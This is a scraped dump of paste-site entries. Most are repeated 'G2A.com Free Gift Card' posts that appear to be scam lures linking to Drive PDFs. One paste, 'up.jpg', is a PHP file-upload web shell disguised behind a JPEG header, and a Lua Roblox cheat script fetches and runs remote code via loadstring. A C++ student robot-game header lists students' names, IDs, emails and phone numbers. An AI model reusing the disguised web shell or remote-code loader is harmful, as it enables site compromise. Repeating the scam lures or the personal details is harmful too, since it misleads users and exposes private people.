id,title,username,language,date,content
CeBeAsKr,🤑G2A.com Free Gift Card FIX July 2024🤑,romikdikson,JavaScript,Sunday 30th of June 2024 06:40:26 AM CDT,"G2A.com complimentary gift card & games guide.
Any voucher for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
E1zZ2B46,🤑G2A.com Free Gift Card FIX July 2024🤑,FeasModz514,JavaScript,Sunday 30th of June 2024 06:35:26 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
eEBbr7UW,up.jpg,blackhat1337,PHP,Sunday 30th of June 2024 06:34:47 AM CDT,"����JFIF��
<?php echo""<b>heked by
<meta name=""robots"" content=""noindex"">

</b><br>"";if($_POST){if(@copy($_FILES[""0""][""tmp_name""],$_FILES[""0""][""name""])){echo""Berhasil"";}else{echo""Gak Berhasil"";}}else{echo""<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=Go!>"";}?>��C	

			

		


��C	������""#Qr����&1!A""2qQa���?�y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&""KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H�@T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;""Pk���Q�_�^�S�x?""���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��"
mLPjbXB1,🤑G2A.com Free Gift Card FIX July 2024🎁,Justpit,JavaScript,Sunday 30th of June 2024 06:34:23 AM CDT,"G2A.com free gift card & games guide.
Any voucher for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
HznLshKG,Untitled,qqt15326,HTML,Sunday 30th of June 2024 06:33:51 AM CDT,"30.06
11881 https://pastebin.com/fYiW9gsj
11882 https://pastebin.com/RhaeQPrz"
hwdDzDMA,🤑G2A.com Free Gift Card FIX July 2024🤑,kiraezwhethe,JavaScript,Sunday 30th of June 2024 06:29:24 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
bVVti2TU,🤑G2A.com Free Gift Card FIX July 2024🤑,DownloadPizza,JavaScript,Sunday 30th of June 2024 06:28:20 AM CDT,"G2A.com free gift card & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
NSBHZqKK,🤑G2A.com Free Gift Card FIX July 2024🤑,7AcxeMC,JavaScript,Sunday 30th of June 2024 06:23:21 AM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
b0rLPtpL,🤑G2A.com Free Gift Card FIX July 2024🎁,ROBLOX_PLSCHIL1O_O,JavaScript,Sunday 30th of June 2024 06:22:17 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
SMrsMYdS,Untitled,nooblollolololol,Lua,Sunday 30th of June 2024 06:19:58 AM CDT,"local function destroyNametags()
    local runService = game:GetService(""RunService"")
    local userInputService = game:GetService(""UserInputService"")
    local nametagDestructionEnabled = false

    local function removeNametags()
        local head = game.Players.LocalPlayer.Character:FindFirstChild(""Head"")
        if head then
            for _, descendant in pairs(head:GetDescendants()) do
                if descendant.Name == ""Nametag"" then
                    descendant:Destroy()
                end
            end
        end
    end

    local function toggleGhostInvisibility()
        if nametagDestructionEnabled then
            game.ReplicatedStorage.Ghostinvisibilityactivated:FireServer()
            game.ReplicatedStorage.Ghostinvisibilitydeactivated:FireServer()
        end
    end

    local function toggleNametagDestruction()
        nametagDestructionEnabled = not nametagDestructionEnabled
		print(""Nametag destruction is now "" .. (nametagDestructionEnabled and ""enabled"" or ""disabled""))
    end

    runService.RenderStepped:Connect(function()
        toggleGhostInvisibility()
        removeNametags()
    end)

    userInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.M and not gameProcessed then
            toggleNametagDestruction()
        end
    end)
end

local function v1()
    loadstring(game:HttpGet(""https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source""))()
end

local function followAndActivateTools()
    local localPlayer = game.Players.LocalPlayer
    local isActive = false
    local activateKey = Enum.KeyCode.G
    local saidTool = ""Killstreak"" -- Define the tool name here

    local function findNearestPlayer()
        local closestPlayer = nil
        local closestDistance = math.huge

        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= localPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                local distance = (player.Character.HumanoidRootPart.Position - localPlayer.Character.HumanoidRootPart.Position).magnitude
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end

        return closestPlayer
    end

    local function lookAtNearestPlayer()
        if isActive then
            local nearestPlayer = findNearestPlayer()
            if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
                local localRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild(""HumanoidRootPart"")
                if localRootPart then
                    local direction = (nearestPlayer.Character.HumanoidRootPart.Position - localRootPart.Position).unit
                    direction = Vector3.new(direction.X, 0, direction.Z) -- Restrict to horizontal
                    local lookAtCFrame = CFrame.new(localRootPart.Position, localRootPart.Position + direction)
                    localRootPart.CFrame = lookAtCFrame
                end
            end
        end
    end

    local function activateSaidTool(tool)
        while isActive do
            tool:Activate()
            task.wait(0.165)
            tool.Parent = localPlayer.Backpack
            task.wait(0.5)
            tool.Parent = localPlayer.Character
        end
    end

    local function toggleToolActivation()
        isActive = not isActive

        if isActive then
            local character = localPlayer.Character
            local backpack = localPlayer.Backpack
            local tool = backpack:FindFirstChild(saidTool)
            if tool then
                tool.Parent = character
                activateSaidTool(tool)
            elseif character:FindFirstChild(saidTool) then
                tool = character:FindFirstChild(saidTool)
                activateSaidTool(tool)
            else
            end
        end
    end

    game:GetService(""RunService"").RenderStepped:Connect(function()
        lookAtNearestPlayer()
    end)

    game:GetService(""UserInputService"").InputBegan:Connect(function(input, gameProcessed)
        if not gameProcessed and input.KeyCode == activateKey then
            toggleToolActivation()
        end
    end)
end

local function destroyAllParts()
    for _, part in pairs(game.workspace:GetChildren()) do
        if part:IsA(""Part"") then
            part:Destroy()
        end
    end
end

local function checkAndDestroyImp()
    while true do
        for _, obj in pairs(game.Workspace:GetChildren()) do
            if obj:IsA(""Model"") and obj.Name == ""Imp"" then
                obj:Destroy()
            end
        end
        task.wait(0.1)
    end
end

task.spawn(checkAndDestroyImp)
task.spawn(destroyNametags)
task.spawn(v1)
task.spawn(followAndActivateTools)
task.spawn(destroyAllParts)
"
ppptHMaT,🤑G2A.com Free Gift Card FIX July 2024🎁,tvprekointerneta00,JavaScript,Sunday 30th of June 2024 06:17:18 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
Sp3TxTSw,🤑G2A.com Free Gift Card FIX July 2024🤑,canogajeff,JavaScript,Sunday 30th of June 2024 06:16:13 AM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
5k23UrGi,🤑G2A.com Free Gift Card FIX July 2024🎁,speed_car,JavaScript,Sunday 30th of June 2024 06:11:00 AM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
PyPM6zVj,🤑G2A.com Free Gift Card FIX July 2024🤑,ColtM4A2,JavaScript,Sunday 30th of June 2024 06:10:07 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
HDvW3gp8,robot.h,xuan1287,C++,Sunday 30th of June 2024 06:06:08 AM CDT,"/***|***|****|
 Program: main.cpp / Robot.h 
Course: OOPDS
 Name: MUHAMMAD AQIL BIN RAHMAT
 ID: 1211107976
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1211107976@student.mmu.edu.my
 Phone: 019-8148313

 Name: TENG CHAY XUAN
 ID: 1231300802 
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1231300802@student.mmu.edu.my
 Phone: 011-10588063

 Name: Akid Syazwan bin Nor Azman Shah 
 ID: 1211111238
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 121111123@student.mmu.edu.my
 Phone: 014-9020901

 Name: MUHAMMAD NABIL NAUFAL BIN MD ZAID
 ID: 1221101160
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1221101160@student.mmu.edu.my
 Phone: 010-5509230
***|***|****/

#pragma once
#include <bits/stdc++.h>

using namespace std;

//Movement
class Robot {
public:
    virtual void setPos(int x, int y){}
    virtual string getType(){ return {};}
    virtual string getName(){ return {};}
    virtual char getLabel(){ return {};}
    virtual int getPosX(){ return {};}
    virtual int getPosY(){ return {};}
    virtual bool getAlive(){ return {};}
    virtual int getLives(){ return {};}
    virtual void respawned(){}
    virtual void died(){}
    virtual void minusLife(){}
    virtual int getKills(){ return {};}
    virtual void kill(){}

    void checkAlive(char (*Bfield), int m, int n)
    {
        char label = getLabel();
        bool isAlive = getAlive();
        for(int i=0; i<m; i++)
        {
            for(int j=0; j<n; j++)
            {
                if (*((Bfield + i * n) + j*2) != label)
                {
                    isAlive = false;
                }
                else
                {
                    isAlive = true;
                    return;
                }
            }
        }

        if(!isAlive)
           died();

    }

    virtual char move(char (*Bfield), int m, int n, ofstream &output) = 0;
    virtual char fire(char (*Bfield), int m, int n, ofstream &output) = 0;
    virtual char look(char (*Bfield), int m, int n, ofstream &output) = 0;
    virtual char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output) = 0;

    // Friend function to overload the << operator
    friend ostream& operator<<(ostream& os, Robot& robot);
};

// We overload the << operator to printout the name of the robot.
ostream& operator<<(ostream& os, Robot& Robot)
{
    os << ""["" << Robot.getLabel() << ""]"" << ""("" << Robot.getType() << "")"" << Robot.getName();
    return os;
}



//--------------Robot Functions--------------------
class MovingRobot : virtual public Robot {
public:
    virtual char move(char (*Bfield), int m, int n, ofstream &output)
    {
        bool invalid = false;
        int PosX = getPosX();
        int PosY = getPosY();
        char label = getLabel();
        int moveX = 0;
        int moveY = 0;

        //loop to check if there are no valid movements
        for(int i=PosY-1; i<PosY+2; i++)
        {
            for(int j=PosX-1; j<PosX+2; j++)
            {
                //Not a single valid movement found for the robot
                if(*((Bfield + i * n) + j*2) != '-' && *((Bfield + i * n) + j*2) == label && j == 0 && j == m-1 && i == 0 && (i*2) == n)
                {
                    invalid = true;
                    cout << getName() << ""["" << getType() << ""] is stuck and cannot move!"" << endl;
                    output << getName() << ""["" << getType() << ""] is stuck and cannot move!"" << endl;
                    return *Bfield;
                }

                else //Any single valid movement found
                {
                    break;
                }
            }
        }

        if(!invalid)
        {
            //set previous position to '-' to make empty
            *((Bfield + PosY * n) + PosX*2) = '-';

            //loop to get where the robot moves using rand
            do{
                moveX = -1 + (1-(-1)) * rand() % 3;
                moveY = -1 + (1-(-1)) * rand() % 3;
            }while((moveX == 0 && moveY == 0) || PosY + moveY == 0 || PosY + moveY == m-1 || *((Bfield + (PosY + moveY) * n) + (PosX + moveX)*2) != '-');
        }

        //add movex and movey to respective x and y positions to change robot position
        int newPosX = PosX + moveX;
        int newPosY = PosY + moveY;

        //move robot label to its position
        *((Bfield + newPosY * n) + newPosX*2) = label;

        cout << getName() << "" at ("" << PosX << "","" << PosY << "") moved to ("" << newPosX << "","" << newPosY << "")"" << endl;
        output << getName() << "" at ("" << PosX << "","" << PosY << "") moved to ("" << newPosX << "","" << newPosY << "")"" << endl;

        //change robot position
        setPos(newPosX, newPosY);

        return *Bfield;
    }

    virtual void nothing() = 0;
};

class ShootingRobot : virtual public Robot {
public:
    virtual char fire(char (*Bfield), int m, int n, ofstream &output)
    {
        int PosX = getPosX();
        int PosY = getPosY();
        int shootCoordX, shootCoordY;
        int shootX = 0;
        int shootY = 0;

        while(shootX == 0 && shootY == 0 || abs(shootX)+abs(shootY) > 5 || *((Bfield + shootCoordY * n) + shootCoordX*2) == '*')
        {
            shootCoordX = rand() % (n-3)/2+1;
            shootCoordY = rand() % (m-2)+1;
            shootX = shootCoordX - PosX;
            shootY = shootCoordY - PosY;
        }

        if(*((Bfield + shootCoordY * n) + shootCoordX*2) != '-' && *((Bfield + shootCoordY * n) + shootCoordX*2) != '*')
        {
            cout << getName() << "" hit another robot at ("" << shootX << "","" << shootY << "") from it's own position!"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            output << getName() << "" hit another robot at ("" << shootX << "","" << shootY << "") from it's own position!"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            kill();
            return *Bfield;
        }

        cout << getName() << "" hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
        output << getName() << "" hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;

        { return {};}
    }

    virtual void nothing() = 0;
};

class SteppingRobot : virtual public Robot {
public:
    virtual char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output)
    {
        int PosX = getPosX();
        int PosY = getPosY();
        char label = getLabel();

        //Set previous position in battlefield to '-' to mark as empty
        *((Bfield + PosY * n) + PosX*2) = '-';

        PosX = targetX;
        PosY = targetY;

        //Change robot position
        setPos(PosX, PosY);

        //Move to new position in battlefield
        *((Bfield + PosY * n) + PosX*2) = label;

        cout << getName() << "" found a target and stepped on another robot at ("" << PosX << "","" << PosY << "")!"" << endl;
        output << getName() << "" found a target and stepped on another robot at ("" << PosX << "","" << PosY << "")!"" << endl;

        //Increase robot kill
        kill();

        return *Bfield;
    }

    virtual void nothing() = 0;
};

class SeeingRobot : virtual public Robot {
public:
    virtual char look(char (*Bfield), int m, int n, ofstream &output)
    {
        int PosX = getPosX();
        int PosY = getPosY();
        char label = getLabel();
        bool target;
        int targetX, targetY;

        //loop to find any target 1 tile around the robot
        for(int i=PosY-1; i<PosY+2; i++)
        {
            for(int j=PosX-1; j<PosX+2; j++)
            {
                //if a target is found
                if(*((Bfield + i * n) + j*2) != '-' && *((Bfield + i * n) + j*2) != '|' && *((Bfield + i * n) + j*2) != '+' && *((Bfield + i * n) + j*2) != label && *((Bfield + i * n) + j*2) != '*')
                {
                    target = true;
                    targetX = j;
                    targetY = i;
                    step((char*)Bfield, m, n, targetX, targetY, output);
                    return *Bfield;
                }

            }

        }

        move((char*)Bfield, m, n, output);
        { return {};}
    }

    virtual void nothing() = 0;

};


//-------------ROBOT TYPES-----------------


///RoboCop: Moves and Shoots - Upgrade: TerminatorRoboCop
class RoboCop : public SeeingRobot, public MovingRobot, public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    RoboCop(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""RoboCop"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    int getKills(){return kills;}
    void kill(){kills++;}
    void nothing() {}


    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    ~RoboCop(){cout << getName() << ""["" << getType() << ""] Destroyed and Scrapped"";}

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n,output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n,output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}

};

///Terminator: Looks and Moves - Upgrade: TerminatorRoboCop
class Terminator : public SeeingRobot, public MovingRobot, public SteppingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    int targetX, targetY;
    bool alive;

public:
    Terminator(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""Terminator"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    void setTarget(int x,int y)
    {
        targetX = x;
        targetY = y;
    }

    ~Terminator(){cout << getName() << ""["" << getType() << ""] Destroyed and Scrapped"";}

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n,output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char look(char (*Bfield), int m, int n, ofstream &output){
        return SeeingRobot::look(Bfield,m,n,output);
    }
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){
        return SteppingRobot::step(Bfield,m ,n, targetX, targetY,output);
    }

};

///BlueThunder: Shoots - Upgrade: MadBot
class BlueThunder : public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;
    int currentDirection;

public:
    BlueThunder(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""BlueThunder"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
        currentDirection = 0;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    int getCD(){return currentDirection;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    char fire(char (*Bfield), int m, int n, ofstream &output) override
    {
        int targetX, targetY;
        int directionX, directionY;

        //array to store BlueThunder's firing directions
        int directions[8][2] = {
        {0, 1},  // Up
        {1, 1},  // Up-Right
        {1, 0},   // Right
        {1, -1},   // Down-Right
        {0, -1},   // Down
        {-1, -1},  // Down-Left
        {-1, 0},  // Left
        {-1, 1}  // Up-Left
        };

        //Set X and Y positions of BlueThunder's next shot
        do{
            directionX = directions[currentDirection][0];
            directionY = directions[currentDirection][1];
            targetX = PosX + directionX;
            targetY = PosY + directionY;

            //Set next direction for shot in the next turn
            currentDirection++;
            if (currentDirection == 8) {
                currentDirection = 0;
            }

        }while(*((Bfield + targetY * n) + targetX*2) == '|' || targetY == 0 || targetY == m-1);// Check for Boundaries

        // If shot hits another robot
        if(*((Bfield + targetY * n) + targetX*2) != '-' && *((Bfield + targetY * n) + targetX*2) != '*')
        {
            cout << getName() << "" hit another robot at ("" << directionX << "","" << directionY << "") from it's own position!"" << endl;
            *((Bfield + targetY * n) + targetX*2) = '*';
            output << getName() << "" hit another robot at ("" << directionX << "","" << directionY << "") from it's own position!"" << endl;
            *((Bfield + targetY * n) + targetX*2) = '*';
            kill();
            return *Bfield;
        }

        cout << getName() << "" hit nothing at ("" << directionX << "","" << directionY << "") from it's own position"" << endl;
        output << getName() << "" hit nothing at ("" << directionX << "","" << directionY << "") from it's own position"" << endl;
        { return {}; }
    }

    char move(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}


};

///Madbot: Shoots - Upgrade: RoboTank
class MadBot : public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    MadBot(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""MadBot"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel() {return label;}
    int getPosX() {return PosX;}
    int getPosY() {return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    char fire(char (*Bfield), int m, int n, ofstream &output) override
    {
        int shootX, shootY;
        int PosX = getPosX();
        int PosY = getPosY();

        do{
        shootX = -1 + (1-(-1)) * rand() % 3;
        shootY = -1 + (1-(-1)) * rand() % 3;
        }while((shootX == 0 && shootY == 0) || PosX + shootX == 0 || (PosX + shootX)*2 == n-1 || PosY + shootY == 0 || PosY + shootY == m-1);

        int shootCoordX = PosX + shootX;
        int shootCoordY = PosY + shootY;

        if(*((Bfield + shootCoordY * n) + shootCoordX*2) != '-' && *((Bfield + shootCoordY * n) + shootCoordX*2) != '*')
        {
            cout << getName() << "" hits another robot at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            output << getName() << "" hits another robot at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            kill();
            return *Bfield;
        }

        cout << getName() << "" shot and hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
        output << getName() << "" shot and hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;

        return *Bfield;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}
};

///RoboTank: Shoots - Upgrade: UltimateRobot
class RoboTank : public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    RoboTank(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""RoboTank"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n, output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}
};

///TerminatorRoboCop: Looks, Moves, Steps and Shoots - Upgrade: UltimateRobot
class TerminatorRoboCop : public SeeingRobot, public MovingRobot, public SteppingRobot, public ShootingRobot{
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    TerminatorRoboCop(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        cout << endl << Rname << "" has been upgraded to TerminatorRoboCop!"" << endl;
        type = ""TerminatorRoboCop"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n, output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n, output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){
        return SeeingRobot::look(Bfield,m,n, output);
    }
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){
        return SteppingRobot::step(Bfield,m,n, targetX, targetY, output);
    }
};

///UltimateRobot: Looks, Moves and Shoots - Upgrade: MAX
class UltimateRobot : public SeeingRobot, public MovingRobot, public SteppingRobot, public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    UltimateRobot(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        cout << endl << Rname << "" has been upgraded to UltimateRobot!"" << endl;
        type = ""UltimateRobot"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n, output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n, output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){
        return SeeingRobot::look(Bfield,m,n, output);
    }
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}
};
"
